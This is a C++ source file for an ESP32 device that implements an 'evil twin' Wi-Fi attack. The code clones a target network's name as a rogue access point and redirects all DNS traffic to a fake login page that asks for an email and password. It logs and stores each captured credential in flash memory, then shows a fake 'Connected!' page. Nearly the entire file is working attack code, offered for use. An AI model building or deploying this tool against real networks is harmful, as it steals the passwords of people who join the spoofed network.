#include "evil_twin.h"

// ─── Captive Portal HTML (inline, <4KB) ───
const char EvilTwin::CAPTIVE_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Wi-Fi Login Required</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,sans-serif;background:#f0f2f5;display:flex;
justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;padding:32px 24px;
box-shadow:0 2px 16px rgba(0,0,0,.12);max-width:360px;width:90%}
h2{text-align:center;color:#1a1a2e;margin-bottom:4px;font-size:20px}
.sub{text-align:center;color:#666;font-size:13px;margin-bottom:24px}
label{display:block;font-size:13px;color:#333;margin-bottom:4px;margin-top:12px}
input{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;
font-size:15px;outline:none}
input:focus{border-color:#4a90d9}
button{width:100%;margin-top:20px;padding:12px;background:#4a90d9;color:#fff;
border:none;border-radius:8px;font-size:16px;cursor:pointer}
button:hover{background:#357abd}
.lock{text-align:center;font-size:28px;margin-bottom:8px}
</style></head><body>
<div class="card">
<div class="lock">&#128274;</div>
<h2>Wi-Fi Login Required</h2>
<p class="sub">Network Security Check</p>
<form action="/submit" method="POST">
<label>Email</label>
<input type="email" name="email" placeholder="your@email.com" required>
<label>Password</label>
<input type="password" name="password" placeholder="Enter password" required>
<button type="submit">Connect to Internet</button>
</form></div></body></html>
)rawliteral";

const char EvilTwin::THANKS_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>
body{font-family:-apple-system,sans-serif;background:#f0f2f5;display:flex;
justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;padding:32px;text-align:center;
box-shadow:0 2px 16px rgba(0,0,0,.12);max-width:360px;width:90%}
.check{font-size:48px;margin-bottom:12px}
h2{color:#2d8f2d}
p{color:#666;margin-top:8px;font-size:14px}
</style>
<meta http-equiv="refresh" content="3;url=http://www.msftconnecttest.com/redirect">
</head><body>
<div class="card">
<div class="check">&#9989;</div>
<h2>Connected!</h2>
<p>Redirecting to the internet...</p>
</div></body></html>
)rawliteral";

// ─── DNS Task ───
void EvilTwin::_dnsTaskFunc(void* param) {
  EvilTwin* self = (EvilTwin*)param;
  while (true) {
    self->_dnsServer.processNextRequest();
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}

// ─── Constructor / Destructor ───
EvilTwin::EvilTwin() : _running(false), _captureCount(0), _server(nullptr), _dnsTaskHandle(nullptr) {
  _ssid[0] = '\0';
}

EvilTwin::~EvilTwin() {
  if (_running) stop();
  if (_server) {
    delete _server;
    _server = nullptr;
  }
}

// ─── Start ───
void EvilTwin::start(const char* ssid, uint8_t channel, const char* password) {
  if (_running) stop();

  strncpy(_ssid, ssid, sizeof(_ssid) - 1);
  _ssid[sizeof(_ssid) - 1] = '\0';
  _captureCount = 0;
  _lastCapture = "";

  Serial.printf("[EvilTwin] Starting AP: %s ch:%d\n", _ssid, channel);

  // 1. Set mode to AP+STA
  WiFi.mode(WIFI_MODE_APSTA);
  delay(100);

  // 2. Start Soft AP cloning the target
  if (password && strlen(password) > 0) {
    WiFi.softAP(_ssid, password, channel);
  } else {
    WiFi.softAP(_ssid, NULL, channel);
  }
  delay(200);

  IPAddress apIP = WiFi.softAPIP();
  Serial.printf("[EvilTwin] AP IP: %s\n", apIP.toString().c_str());

  // 3. Start DNS Server — wildcard redirect
  _dnsServer.start(53, "*", apIP);

  // 4. Start AsyncWebServer
  if (_server) {
    delete _server;
  }
  _server = new AsyncWebServer(80);

  // GET / — captive portal page
  _server->on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
    request->send_P(200, "text/html", CAPTIVE_HTML);
  });

  // GET /hotspot* — redirect to /
  _server->on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest* request) {
    request->redirect("/");
  });
  _server->on("/generate_204", HTTP_GET, [](AsyncWebServerRequest* request) {
    request->redirect("/");
  });
  _server->on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest* request) {
    request->redirect("/");
  });

  // POST /submit — capture credentials
  _server->on("/submit", HTTP_POST, [this](AsyncWebServerRequest* request) {
    String user = "";
    String pass = "";
    if (request->hasParam("email", true)) {
      user = request->getParam("email", true)->value();
    }
    if (request->hasParam("password", true)) {
      pass = request->getParam("password", true)->value();
    }

    if (user.length() > 0 || pass.length() > 0) {
      _captureCount++;
      if (user.length() > 0) {
        _lastCapture = user + ":" + pass;
      } else {
        _lastCapture = pass;
      }
      Serial.printf("[EvilTwin] Capture #%d: %s\n", _captureCount, _lastCapture.c_str());
      _saveCapture(String(_ssid), user, pass);
    }

    request->redirect("/thanks");
  });

  // GET /thanks — success page
  _server->on("/thanks", HTTP_GET, [](AsyncWebServerRequest* request) {
    request->send_P(200, "text/html", THANKS_HTML);
  });

  // Catch-all — redirect to /
  _server->onNotFound([](AsyncWebServerRequest* request) {
    request->redirect("/");
  });

  _server->begin();

  // 5. Spawn DNS processing task (4KB stack)
  xTaskCreate(_dnsTaskFunc, "dns_loop", 4096, this, 1, &_dnsTaskHandle);

  _running = true;
  Serial.println("[EvilTwin] Started successfully");
}

// ─── Stop ───
// IMPORTANT: Do NOT call WiFi.mode(WIFI_OFF) — on ESP32-C3 Arduino Core 3.x
// it deinitializes the entire WiFi driver, causing crashes on subsequent use.
void EvilTwin::stop() {
  // Stop DNS task first
  if (_dnsTaskHandle != nullptr) {
    vTaskDelete(_dnsTaskHandle);
    _dnsTaskHandle = nullptr;
  }
  _dnsServer.stop();

  if (_server) {
    _server->end();
    delete _server;
    _server = nullptr;
  }

  WiFi.softAPdisconnect(true);   // disconnect AP clients
  WiFi.mode(WIFI_STA);           // drop back to STA, NOT WIFI_OFF

  _running = false;
  _captureCount = 0;
  Serial.println("[EvilTwin] Stopped");
}

// ─── Client Count ───
int EvilTwin::getClientCount() {
  if (!_running) return 0;
  return WiFi.softAPgetStationNum();
}

// ─── NVS Credential Storage ───
void EvilTwin::_saveCapture(const String& ssid, const String& user, const String& pass) {
  Preferences prefs;
  prefs.begin("eviltwin", false);

  int count = prefs.getInt("cap_count", 0);
  int idx = count % 10;  // circular buffer of 10

  // Build JSON string
  String json = "{\"ssid\":\"" + ssid + "\",\"user\":\"" + user +
                "\",\"pass\":\"" + pass + "\",\"ts\":" + String(millis() / 1000) + "}";

  char key[8];
  snprintf(key, sizeof(key), "cap_%d", idx);
  prefs.putString(key, json);

  count++;
  prefs.putInt("cap_count", count);
  prefs.end();
}

void EvilTwin::loadCaptures() {
  // No-op: captures read on-demand via getStoredCapture()
}

int EvilTwin::getStoredCaptureCount() {
  Preferences prefs;
  prefs.begin("eviltwin", true);
  int count = prefs.getInt("cap_count", 0);
  prefs.end();
  return count > 10 ? 10 : count;
}

String EvilTwin::getStoredCapture(int index) {
  if (index < 0 || index >= 10) return "";
  Preferences prefs;
  prefs.begin("eviltwin", true);
  char key[8];
  snprintf(key, sizeof(key), "cap_%d", index);
  String result = prefs.getString(key, "");
  prefs.end();
  return result;
}

void EvilTwin::clearCaptures() {
  Preferences prefs;
  prefs.begin("eviltwin", false);
  prefs.clear();
  prefs.end();
}
